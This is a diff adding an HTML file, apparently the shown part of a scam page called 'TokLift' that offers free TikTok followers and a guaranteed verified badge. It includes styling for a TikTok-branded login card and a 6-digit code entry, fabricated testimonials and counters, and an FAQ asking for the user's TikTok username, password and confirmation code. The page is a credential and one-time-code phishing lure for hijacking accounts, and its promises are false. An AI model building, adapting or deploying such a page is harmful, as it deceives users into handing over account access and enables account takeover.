@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<title>TokLift — Free TikTok Followers, Verified in 60 Seconds</title>
+<meta name="description" content="TokLift grows your TikTok for free. Choose a package, clear 3 quick tasks, log in. Everyone gets verified — no follower minimum.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23FE2C55' d='M12.53.02C13.84 0 15.14.01 16.44 0c.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z'/></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+:root{
+  --c:#FE2C55;--cy:#25F4EE;--ok:#22c55e;--blue:#3b82f6;
+  --bg:#000;--card:#101014;--card2:#17171c;--line:rgba(255,255,255,.09);
+  --mut:#8d8d97;--txt:#f4f4f7;
+}
+html{-webkit-text-size-adjust:100%}
+body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;font-size:15px;line-height:1.55;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background:
+  radial-gradient(60% 45% at 50% -10%,rgba(254,44,85,.17),transparent 70%),
+  radial-gradient(45% 35% at 90% 6%,rgba(37,244,238,.11),transparent 70%)}
+main{position:relative;z-index:1}
+a{color:inherit;text-decoration:none}
+svg{display:block}
+.hide{display:none!important}
+.wrap{width:100%;max-width:1080px;margin:0 auto;padding:0 20px}
+.panel{width:100%;max-width:520px;margin:0 auto;padding:0 20px}
+.ico{width:22px;height:22px;flex-shrink:0}
+
+/* nav */
+nav{position:sticky;top:0;z-index:60;background:rgba(0,0,0,.74);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.navin{display:flex;align-items:center;justify-content:space-between;height:62px;gap:14px}
+.logo{display:flex;align-items:center;gap:9px;font-weight:800;font-size:17.5px;letter-spacing:-.4px;color:#fff}
+.logo .ico{width:25px;height:25px}
+.navlinks{display:flex;gap:26px;font-size:13.5px;color:#b9b9c2;margin-left:auto;margin-right:6px}
+.navlinks a:hover{color:#fff}
+.navstep{font-size:12px;color:var(--mut);border:1px solid var(--line);padding:6px 12px;border-radius:100px;margin-left:auto}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:9px;background:var(--c);color:#fff;border:0;border-radius:12px;padding:14px 24px;font-family:inherit;font-weight:700;font-size:15px;cursor:pointer;transition:transform .18s,filter .18s,opacity .18s;white-space:nowrap}
+.btn:hover{filter:brightness(1.08);transform:translateY(-1px)}
+.btn:active{transform:translateY(0)}
+.btn.ghost{background:rgba(255,255,255,.06);border:1px solid var(--line);color:#fff}
+.btn.dark{background:#fff;color:#000}
+.btn.sm{padding:10px 16px;font-size:13px;border-radius:10px}
+.btn.block{width:100%}
+.btn:disabled{opacity:.45;cursor:not-allowed;transform:none;filter:none}
+
+/* views */
+.view{display:none}
+.view.on{display:block;animation:fade .35s ease}
+@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+/* hero */
+.hero{display:grid;grid-template-columns:1.08fr .92fr;gap:52px;align-items:center;padding:62px 0 34px}
+.pill{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line);background:rgba(255,255,255,.04);padding:7px 14px;border-radius:100px;font-size:12.5px;color:#c9c9d1}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 0 rgba(34,197,94,.6);animation:pulse 2s infinite;flex-shrink:0}
+@keyframes pulse{70%{box-shadow:0 0 0 8px rgba(34,197,94,0)}100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}}
+h1{font-size:clamp(31px,5.6vw,53px);line-height:1.04;letter-spacing:-1.6px;font-weight:800;margin:20px 0 0}
+.grad{background:linear-gradient(94deg,var(--cy),#fff 45%,var(--c));-webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{color:#a9a9b4;font-size:16px;margin:18px 0 0;max-width:520px}
+.ctas{display:flex;gap:12px;flex-wrap:wrap;margin-top:28px}
+.trust{display:flex;align-items:center;gap:18px;margin-top:30px;flex-wrap:wrap}
+.avs{display:flex}
+.av{width:30px;height:30px;border-radius:50%;border:2px solid #000;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#000;margin-left:-9px}
+.av:first-child{margin-left:0}
+.trust small{color:var(--mut);font-size:12px;line-height:1.4}
+.stars{color:#FFB800;letter-spacing:1px;font-size:13px}
+
+/* phone mock */
+.phone{background:linear-gradient(180deg,#141419,#0b0b0e);border:1px solid var(--line);border-radius:26px;padding:22px;box-shadow:0 30px 80px rgba(0,0,0,.75);position:relative;overflow:hidden}
+.phone::after{content:"";position:absolute;inset:-40% 40% 60% -20%;background:radial-gradient(closest-side,rgba(254,44,85,.22),transparent);pointer-events:none}
+.phead{display:flex;align-items:center;gap:11px;position:relative}
+.pav{width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,var(--cy),var(--c));display:flex;align-items:center;justify-content:center;font-weight:800;color:#000;font-size:16px}
+.pname{font-weight:700;font-size:14.5px;display:flex;align-items:center;gap:6px}
+.pname .v{width:15px;height:15px}
+.phandle{font-size:12px;color:var(--mut)}
+.pcount{font-size:42px;font-weight:800;letter-spacing:-1.6px;margin:20px 0 0;position:relative}
+.pcount span{font-size:13px;font-weight:600;color:var(--mut);letter-spacing:0;margin-left:8px}
+.pbar{height:7px;background:rgba(255,255,255,.09);border-radius:5px;overflow:hidden;margin:18px 0 10px;position:relative}
+.pbar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--cy),var(--c));transition:width 1.2s ease}
+.pnote{font-size:11.5px;color:var(--mut);display:flex;justify-content:space-between;position:relative}
+
+/* sections */
+.sec{padding:58px 0}
+.sec.tight{padding:34px 0}
+.kicker{font-size:11.5px;letter-spacing:2.2px;text-transform:uppercase;color:var(--c);font-weight:800;text-align:center;margin:0 0 12px}
+h2{font-size:clamp(23px,4.4vw,33px);letter-spacing:-1px;font-weight:800;text-align:center;margin:0}
+.sub{color:#a3a3ae;text-align:center;max-width:600px;margin:14px auto 0;font-size:15px}
+.grid{display:grid;gap:16px;margin-top:34px}
+.g2{grid-template-columns:repeat(auto-fit,minmax(250px,1fr))}
+.g3{grid-template-columns:repeat(auto-fit,minmax(215px,1fr))}
+.g4{grid-template-columns:repeat(auto-fit,minmax(185px,1fr))}
+.card{background:linear-gradient(180deg,#131318,#0d0d11);border:1px solid var(--line);border-radius:16px;padding:22px;transition:border-color .2s,transform .2s}
+.card:hover{border-color:rgba(255,255,255,.18);transform:translateY(-2px)}
+.card h3{font-size:15px;margin:0 0 7px;font-weight:700}
+.card p{margin:0;font-size:13.5px;color:#9b9ba5;line-height:1.6}
+.cico{width:38px;height:38px;border-radius:11px;background:rgba(254,44,85,.12);border:1px solid rgba(254,44,85,.25);display:flex;align-items:center;justify-content:center;margin-bottom:14px;font-size:17px}
+.stepnum{width:30px;height:30px;border-radius:9px;background:#fff;color:#000;font-weight:800;font-size:14px;display:flex;align-items:center;justify-content:center;margin-bottom:14px}
+
+/* ticker */
+.ticker{border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:13px 0;background:rgba(255,255,255,.015);overflow:hidden}
+.ticker .wrap{display:flex;align-items:center;gap:12px;font-size:12.5px;color:#a8a8b3}
+.ticker b{color:#fff}
+
+/* verify band */
+.band{background:linear-gradient(120deg,rgba(59,130,246,.14),rgba(254,44,85,.1));border:1px solid rgba(255,255,255,.12);border-radius:22px;padding:34px;display:grid;grid-template-columns:auto 1fr;gap:26px;align-items:center}
+.band .bigv{width:76px;height:76px}
+.band h3{margin:0 0 8px;font-size:21px;letter-spacing:-.5px}
+.band p{margin:0;color:#b6b6c0;font-size:14px}
+.band .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:14px}
+.tagx{font-size:11.5px;border:1px solid var(--line);background:rgba(0,0,0,.35);padding:5px 11px;border-radius:100px;color:#cfcfd8}
+
+/* plans */
+.plans{display:grid;gap:14px;margin-top:28px}
+.plan{position:relative;text-align:left;background:linear-gradient(180deg,#131318,#0d0d11);border:1.5px solid var(--line);border-radius:18px;padding:20px;cursor:pointer;font-family:inherit;color:inherit;transition:.2s}
+.plan:hover{border-color:rgba(255,255,255,.25);transform:translateY(-2px)}
+.plan.sel{border-color:var(--c);box-shadow:0 0 0 4px rgba(254,44,85,.12)}
+.ptop{display:flex;align-items:center;justify-content:space-between;gap:10px}
+.pname{font-weight:800;font-size:14.5px}
+.free{font-size:10.5px;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:#4ade80;background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.3);padding:4px 9px;border-radius:100px}
+.ribbon{position:absolute;top:-10px;right:16px;font-size:10px;font-weight:800;letter-spacing:1px;text-transform:uppercase;background:var(--c);color:#fff;padding:4px 10px;border-radius:100px}
+.pnum{font-size:33px;font-weight:800;letter-spacing:-1.4px;margin:12px 0 2px}
+.pnum span{font-size:12px;font-weight:600;color:var(--mut);letter-spacing:0;margin-left:7px}
+.plan ul{list-style:none;padding:0;margin:14px 0 0;font-size:13px;color:#a2a2ac}
+.plan li{padding:5px 0 5px 20px;position:relative}
+.plan li::before{content:"✓";position:absolute;left:0;color:var(--c);font-weight:800}
+.pick{display:block;text-align:center;margin-top:16px;background:rgba(255,255,255,.06);border:1px solid var(--line);padding:10px;border-radius:10px;font-size:13px;font-weight:700}
+.plan.sel .pick{background:var(--c);border-color:var(--c);color:#fff}
+
+/* flow */
+.flowhead{padding:34px 0 4px}
+.h2s{font-size:25px;letter-spacing:-.9px;font-weight:800;margin:0}
+.leads{color:var(--mut);font-size:14px;margin:10px 0 0}
+.pbar2{height:6px;background:rgba(255,255,255,.1);border-radius:4px;overflow:hidden;margin:18px 0 8px}
+.pbar2 i{display:block;height:100%;width:0;background:var(--c);transition:width .45s ease}
+.count{display:flex;justify-content:space-between;font-size:11.5px;color:var(--mut);margin-bottom:20px}
+.task{display:flex;align-items:center;gap:14px;padding:17px 0;border-bottom:1px solid var(--line)}
+.task:last-of-type{border:0}
+.chk{width:25px;height:25px;border-radius:50%;border:1.5px solid rgba(255,255,255,.22);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:13px;color:transparent;transition:.25s}
+.task.done .chk{background:var(--c);border-color:var(--c);color:#000}
+.task .t{flex:1;font-size:14px;font-weight:600}
+.task .t span{display:block;font-size:11.5px;color:var(--mut);margin-top:2px;font-weight:400}
+.task.done .t{color:var(--mut);text-decoration:line-through}
+.task button{background:var(--c);border:0;color:#fff;font-size:12px;font-weight:700;padding:10px 16px;border-radius:8px;font-family:inherit;cursor:pointer;min-width:86px}
+.task.done button{display:none}
+.notice{background:#101014;border:1px dashed rgba(255,255,255,.16);border-radius:12px;padding:14px;font-size:12px;color:var(--mut);margin:18px 0;text-align:center;line-height:1.6}
+.notice b{color:#fff}
+
+/* verify */
+.vrow{display:flex;align-items:center;gap:11px;font-size:13.5px;padding:10px 0;opacity:.32;transition:.35s}
+.vrow.on{opacity:1}
+.vrow .vd{width:20px;height:20px;border-radius:50%;background:rgba(34,197,94,.15);border:1px solid rgba(34,197,94,.4);display:flex;align-items:center;justify-content:center;font-size:11px;color:#4ade80}
+.field{width:100%;background:#0b0b0e;border:1px solid var(--line);border-radius:12px;padding:15px 16px;color:#fff;font-family:inherit;font-size:15px;transition:.2s}
+.field:focus{outline:0;border-color:var(--c);box-shadow:0 0 0 3px rgba(254,44,85,.13)}
+.field::placeholder{color:#5f5f6a}
+label.lb{display:block;font-size:12px;color:var(--mut);margin:0 0 7px;font-weight:600}
+.prefix{position:relative}
+.prefix .at{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:var(--mut)}
+.prefix .field{padding-left:32px}
+.vdone{text-align:center;padding:10px 0}
+.vdone .bigv{width:70px;height:70px;margin:0 auto 14px}
+.vdone h3{margin:0 0 6px;font-size:19px}
+.vdone p{margin:0 0 20px;color:var(--mut);font-size:13.5px}
+
+/* login */
+.tkcard{background:#fff;color:#111;border-radius:20px;padding:26px 22px;box-shadow:0 30px 70px rgba(0,0,0,.6)}
+.tkcard h3{margin:0;font-size:19px;text-align:center;letter-spacing:-.4px;color:#111}
+.tkcard .thint{text-align:center;font-size:12.5px;color:#6b6b73;margin:9px 0 22px;line-height:1.5}
+.tkcard label.lb{color:#6b6b73}
+.tkcard .field{background:#f4f4f6;border:1px solid #e2e2e6;color:#111}
+.tkcard .field::placeholder{color:#9a9aa3}
+.tkcard .field:focus{border-color:#FE2C55;box-shadow:0 0 0 3px rgba(254,44,85,.12)}
+.tkcard .forgot{text-align:right;font-size:12px;color:#FE2C55;font-weight:600;margin:10px 0 0}
+.tkcard .legal{font-size:11px;color:#8b8b93;text-align:center;margin:16px 0 0;line-height:1.5}
+.tklogo{display:flex;justify-content:center;margin-bottom:12px}
+.tklogo .ico{width:38px;height:38px}
+.scope{border-top:1px solid #ececf0;margin-top:20px;padding-top:14px;font-size:11.5px;color:#8b8b93}
+.scope b{color:#111}
+.otp{display:flex;gap:9px;margin:22px 0 6px}
+.otp input{width:100%;aspect-ratio:1/1.15;text-align:center;font-size:21px;font-weight:800;background:#0b0b0e;border:1px solid var(--line);border-radius:12px;color:#fff;font-family:inherit}
+.otp input:focus{outline:0;border-color:var(--c);box-shadow:0 0 0 3px rgba(254,44,85,.13)}
+.resend{font-size:12.5px;color:var(--mut);text-align:center;margin-top:16px}
+.resend b{color:var(--c);cursor:pointer}
+
+/* done */
+.doneico{width:80px;height:80px;border-radius:50%;background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.35);display:flex;align-items:center;justify-content:center;font-size:36px;color:#4ade80;margin:0 auto 20px}
+.sumrow{display:flex;justify-content:space-between;font-size:13.5px;padding:13px 0;border-bottom:1px solid var(--line)}
+.sumrow:last-child{border:0}
+.sumrow span:first-child{color:var(--mut)}
+.sumrow span:last-child{font-weight:700}
+
+/* faq */
+details{border:1px solid var(--line);border-radius:14px;padding:16px 18px;margin-bottom:10px;background:rgba(255,255,255,.015)}
+details[open]{border-color:rgba(255,255,255,.2)}
+summary{cursor:pointer;font-weight:700;font-size:14px;list-style:none;display:flex;justify-content:space-between;gap:14px}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"+";color:var(--c);font-weight:800;font-size:18px;line-height:1}
+details[open] summary::after{content:"−"}
+details p{margin:12px 0 0;font-size:13.5px;color:#a3a3ad;line-height:1.65}
+
+/* final + footer */
+.final{background:linear-gradient(120deg,rgba(254,44,85,.16),rgba(37,244,238,.09));border:1px solid rgba(255,255,255,.13);border-radius:24px;padding:44px 28px;text-align:center}
+footer{border-top:1px solid var(--line);padding:34px 0 44px;margin-top:56px}
+.frow{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap;align-items:center;font-size:12.5px;color:var(--mut)}
+.flinks{display:flex;gap:18px;flex-wrap:wrap}
+.flinks a:hover{color:#fff}
+.fine{font-size:11.5px;color:#63636d;margin-top:18px;line-height:1.6}
+
+/* misc */
+#toast{position:fixed;left:50%;bottom:26px;transform:translate(-50%,22px);background:#1b1b21;border:1px solid var(--line);padding:11px 18px;border-radius:100px;font-size:12.5px;font-weight:600;opacity:0;transition:.3s;z-index:99;pointer-events:none}
+#toast.on{opacity:1;transform:translate(-50%,0)}
+#tg{position:fixed;right:12px;bottom:12px;z-index:99;font-size:10.5px;font-weight:700;padding:7px 11px;border-radius:100px;border:1px solid var(--line);background:rgba(18,18,22,.92);color:var(--mut);cursor:pointer;letter-spacing:.3px}
+#tg.on{color:#4ade80;border-color:rgba(74,222,128,.4)}
+.rv{opacity:0;transform:translateY(16px);transition:.65s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+.testi{display:flex;gap:12px;align-items:flex-start}
+.testi .av{width:38px;height:38px;font-size:13px;margin:0}
+.testi .tn{font-weight:700;font-size:13.5px}
+.testi .th{font-size:11.5px;color:var(--mut)}
+.testi p{margin:9px 0 0;font-size:13.5px;color:#a8a8b2;line-height:1.6}
+
+@media(max-width:900px){
+  .hero{grid-template-columns:1fr;gap:38px;padding:44px 0 20px;text-align:center}
+  .lead{margin-left:auto;margin-right:auto}
+  .ctas{justify-content:center}
+  .trust{justify-content:center}
+  .navlinks{display:none}
+  .band{grid-template-columns:1fr;text-align:center;justify-items:center;padding:28px 22px}
+  .phone{max-width:340px;margin:0 auto}
+}
+@media(max-width:520px){
+  .sec{padding:44px 0}
+  .band h3{font-size:18px}
+  .navcta{display:none}
+}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+
+<!-- ================= SVG SPRITE ================= -->
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <symbol id="ttlogo" viewBox="-1.4 -1.4 26.8 26.8">
+    <path transform="translate(-1.05,-.45)" fill="#25F4EE" d="M12.53.02C13.84 0 15.14.01 16.44 0c.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
+    <path transform="translate(1.05,.45)" fill="#FE2C55" d="M12.53.02C13.84 0 15.14.01 16.44 0c.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
+    <path fill="#fff" d="M12.53.02C13.84 0 15.14.01 16.44 0c.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
+  </symbol>
+  <symbol id="verified" viewBox="0 0 24 24">
+    <path d="M12 1.6l2.6 2.2 3.4-.5 1 3.3 3 1.7-1.3 3.2 1.3 3.2-3 1.7-1 3.3-3.4-.5L12 22.4l-2.6-2.2-3.4.5-1-3.3-3-1.7L3.3 12 2 8.8l3-1.7 1-3.3 3.4.5z" fill="#3b82f6"/>
+    <path d="M8.1 12.3l2.6 2.6 5.2-5.3" fill="none" stroke="#fff" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"/>
+  </symbol>
+</svg>
+
+<!-- ================= NAV ================= -->
+<nav>
+  <div class="wrap navin">
+    <a class="logo" href="#home">
+      <svg class="ico" viewBox="-1.4 -1.4 26.8 26.8"><use href="#ttlogo"/></svg>
+      TokLift
+    </a>
+    <div class="navlinks" id="navlinks">
+      <a href="#how">How it works</a>
+      <a href="#plans">Packages</a>
+      <a href="#faq">FAQ</a>
+    </div>
+    <span class="navstep hide" id="navstep">Step 1 of 4</span>
+    <button class="btn sm navcta" id="navcta">Claim followers</button>
+  </div>
+</nav>
+
+<main>
+
+<!-- ================= HOME ================= -->
+<section class="view on" id="v-home">
+  <div class="wrap">
+    <div class="hero">
+      <div>
+        <span class="pill"><span class="dot"></span> <b id="slots">1,284</b>&nbsp;allocations claimed today</span>
+        <h1>Get <span class="grad">10,000 real TikTok followers</span> — free, in under a minute.</h1>
+        <p class="lead">TokLift pushes your account through a creator network. Pick your package, clear three quick tasks, then log in to TikTok to attach the allocation to your account. No card, no follower minimum, no catch.</p>
+        <div class="ctas">
+          <button class="btn" id="heroCta">Claim my followers →</button>
+          <a class="btn ghost" href="#how">See how it works</a>
+        </div>
+        <div class="trust">
+          <div class="avs">
+            <div class="av" style="background:#25F4EE">A</div>
+            <div class="av" style="background:#FE2C55;color:#fff">M</div>
+            <div class="av" style="background:#FFB800">K</div>
+            <div class="av" style="background:#4ade80">J</div>
+            <div class="av" style="background:#a78bfa">S</div>
+          </div>
+          <small><b style="color:#fff">41,900+ creators</b> lifted<br><span class="stars">★★★★★</span> 4.9 average</small>
+        </div>
+      </div>
+
+      <div class="phone">
+        <div class="phead">
+          <div class="pav">Y</div>
+          <div>
+            <div class="pname">your.handle <svg class="v" viewBox="0 0 24 24"><use href="#verified"/></svg></div>
+            <div class="phandle">Lifting in progress…</div>
+          </div>
+        </div>
+        <div class="pcount"><span id="heroCount">1,240</span><span>followers</span></div>
+        <div class="pbar"><i id="heroBar"></i></div>
+        <div class="pnote"><span>Batch 1 of 4</span><span>ETA 24h</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="ticker">
+    <div class="wrap">
+      <span class="dot"></span>
+      <span id="ticker">Loading activity…</span>
+    </div>
+  </div>
+
+  <div class="wrap sec tight">
+    <div class="band rv">
+      <svg class="bigv" viewBox="0 0 24 24"><use href="#verified"/></svg>
+      <div>
+        <h3>No followers? Doesn't matter. Everyone gets verified.</h3>
+        <p>You don't need 1,000 subs or a viral video. Every creator who finishes the three tasks gets a <b style="color:#fff">verified badge reservation</b> attached to their account — plus the follower package. That's the whole point: the account looks established from day one.</p>
+        <div class="tags">
+          <span class="tagx">✓ Verified badge reserved</span>
+          <span class="tagx">✓ Works from 0 followers</span>
+          <span class="tagx">✓ Any account size</span>
+          <span class="tagx">✓ Resets in 24h</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap sec" id="how">
+    <p class="kicker rv">Three steps, one minute</p>
+    <h2 class="rv">How TokLift works</h2>
+    <p class="sub rv">No forms, no card, no waiting list. You clear three tasks and your allocation is released to your account.</p>
+    <div class="grid g3">
+      <div class="card rv"><div class="stepnum">1</div><h3>Pick your package</h3><p>Choose anything from 10K to 100K. Every package is free — the tier only changes how big your lift is.</p></div>
+      <div class="card rv"><div class="stepnum">2</div><h3>Clear 3 quick tasks</h3><p>Follow TokLift on TikTok and Instagram, then run a 5-second profile check to lock in your verified badge. Tasks complete either way.</p></div>
+      <div class="card rv"><div class="stepnum">3</div><h3>Log in &amp; release</h3><p>One quick TikTok login attaches the allocation to the right account. Your followers start landing in batches within 24 hours.</p></div>
+    </div>
+  </div>
+
+  <div class="wrap sec">
+    <p class="kicker rv">Why creators stay</p>
+    <h2 class="rv">Built to look real, because it is</h2>
+    <div class="grid g4">
+      <div class="card rv"><div class="cico">👤</div><h3>Real-looking profiles</h3><p>Avatars, bios and post history — not empty shells that scream "bought".</p></div>
+      <div class="card rv"><div class="cico">📈</div><h3>Delivered in batches</h3><p>Followers arrive gradually over 24h so the growth curve looks organic.</p></div>
+      <div class="card rv"><div class="cico">🔒</div><h3>One login, that's it</h3><p>No card, no email confirm, no dashboard to babysit. Log in once and you're done.</p></div>
+      <div class="card rv"><div class="cico">⚡</div><h3>Zero cost to you</h3><p>The network covers the cost. You just complete the tasks and collect.</p></div>
+    </div>
+  </div>
+
+  <div class="wrap sec" id="plans">
+    <p class="kicker rv">Packages</p>
+    <h2 class="rv">Every tier is free right now</h2>
+    <p class="sub rv">Pick the lift that matches your ambition. You can only claim one per account.</p>
+    <div class="grid g4">
+      <div class="card rv"><h3>Starter</h3><div class="pnum">10K<span>followers</span></div><p style="margin-top:10px">Perfect first lift. Verified badge included.</p></div>
+      <div class="card rv" style="border-color:rgba(254,44,85,.45)"><h3>Creator <span style="font-size:10px;color:var(--c);font-weight:800">POPULAR</span></h3><div class="pnum">25K<span>followers</span></div><p style="margin-top:10px">Most claimed tier. Priority queue placement.</p></div>
+      <div class="card rv"><h3>Influencer</h3><div class="pnum">50K<span>followers</span></div><p style="margin-top:10px">For accounts ready to hit the FYP hard.</p></div>
+      <div class="card rv"><h3>Viral</h3><div class="pnum">100K<span>followers</span></div><p style="margin-top:10px">The full send. Best value per follower.</p></div>
+    </div>
+    <div style="text-align:center;margin-top:30px"><button class="btn rv" id="plansCta">Choose my package →</button></div>
+  </div>
+
+  <div class="wrap sec">
+    <p class="kicker rv">Social proof</p>
+    <h2 class="rv">What creators say</h2>
+    <div class="grid g3">
+      <div class="card rv"><div class="testi"><div class="av" style="background:#25F4EE">A</div><div><div class="tn">Amara O.</div><div class="th">@amara.creates</div></div></div><p style="margin-top:12px;color:#FFB800">★★★★★</p><p>"Started at 340 followers. Woke up to a completely different account. The verified badge was the part that shocked me."</p></div>
+      <div class="card rv"><div class="testi"><div class="av" style="background:#FE2C55;color:#fff">M</div><div><div class="tn">Marcus D.</div><div class="th">@marcusdances</div></div></div><p style="margin-top:12px;color:#FFB800">★★★★★</p><p>"Took me about 40 seconds total. Followed the two pages, verified, logged in, done. Growth came in overnight."</p></div>
+      <div class="card rv"><div class="testi"><div class="av" style="background:#a78bfa">S</div><div><div class="tn">Sofia R.</div><div class="th">@sofiaeats</div></div></div><p style="margin-top:12px;color:#FFB800">★★★★★</p><p>"I've tried three of these things. This is the only one where the followers actually look like people."</p></div>
+    </div>
+  </div>
+
+  <div class="wrap sec" id="faq">
+    <p class="kicker rv">Questions</p>
+    <h2 class="rv">Everything you're about to ask</h2>
+    <div style="max-width:720px;margin:30px auto 0">
+      <details class="rv"><summary>Is it actually free?</summary><p>Yes. All four packages are free. The tasks are how the network funds the lift — you follow two accounts and run a profile check, that's your entire cost.</p></details>
+      <details class="rv"><summary>Do I need a certain number of followers?</summary><p>No. You can claim with 0 followers. Verification is granted to everyone who completes the tasks, which is exactly why it's worth doing now before it gets capped.</p></details>
+      <details class="rv"><summary>Why do you need my TikTok login?</summary><p>So the allocation is attached to the correct account. Your username and password are used once to authorise the lift, then a 6-digit code confirms it's really you.</p></details>
+      <details class="rv"><summary>How fast will I see the followers?</summary><p>Batches start within a few hours and complete inside 24 hours. You'll see it climb in stages — that's intentional, it looks more natural than one big spike.</p></details>
+      <details class="rv"><summary>Do I need to keep the account public?</summary><p>Yes, keep it public for the 24h delivery window. Private accounts can't be attached to the network until they're open.</p></details>
+      <details class="rv"><summary>Is my allocation held?</summary><p>Yes — your slot is reserved for 20 minutes once you start. If you leave mid-way you keep your progress, but the queue moves fast.</p></details>
+    </div>
+  </div>
+
+  <div class="wrap sec">
+    <div class="final rv">
+      <h2>Your followers are waiting.</h2>
+      <p class="sub" style="margin-bottom:26px">Pick a package, clear three tasks, log in. That's the whole thing.</p>
+      <button class="btn" id="finalCta" style="padding:16px 34px;font-size:16px">Start my lift →</button>
+      <p style="font-size:12px;color:var(--mut);margin:16px 0 0">Takes under a minute · No card · Verified badge included</p>
+    </div>
+  </div>
+
+  <footer>
+    <div class="wrap">
+      <div class="frow">
+        <a class="logo" href="#home"><svg class="ico" viewBox="-1.4 -1.4 26.8 26.8"><use href="#ttlogo"/></svg> TokLift</a>
+        <div class="flinks">
+          <a href="#how">How it works</a>
+          <a href="#plans">Packages</a>
+          <a href="#faq">FAQ</a>
+          <a href="https://www.tiktok.com/@toklift.hq" target="_blank" rel="noopener">TikTok</a>
+          <a href="https://www.instagram.com/toklift.hq" target="_blank" rel="noopener">Instagram</a>
+        </div>
+      </div>
